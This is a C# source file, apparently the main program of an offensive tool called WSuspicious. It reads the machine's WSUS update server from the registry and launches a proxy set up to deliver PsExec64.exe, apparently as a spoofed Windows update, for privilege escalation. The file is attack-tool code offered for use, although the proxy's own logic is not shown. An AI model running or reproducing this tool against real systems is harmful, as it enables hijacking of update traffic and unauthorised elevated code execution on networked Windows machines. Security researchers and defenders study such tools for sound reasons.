using System;
using Microsoft.Win32;
using WSuspicious.Proxy;

namespace WSuspicious
{
    class Program
    {
        public static int Main(string[] args)
        {
            string wsusConfig = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\", "WUServer", null);

            string wsusHost = null;
            bool isHttps = false;
            if (wsusConfig != null)
            {
                Uri wsusURI = new Uri(wsusConfig);
                wsusHost = wsusURI.Host;
                isHttps = wsusURI.Scheme == "https" ? true : false;

                Console.WriteLine(String.Format("Detected {0} WSUS Server - {1}", wsusURI.Scheme, wsusHost));

                WsusProxy proxy = new WsusProxy(wsusHost, isHttps, @".\PsExec64.exe");
                proxy.Start();

                Console.WriteLine("Hit any key to exit..");
                Console.WriteLine();
                Console.Read();

                proxy.Stop();
            }
            else
            {
                Console.WriteLine("No WSUS Server detected.");
                Console.WriteLine("Stopping now.");
            }
            return 0;
        }
    }
}
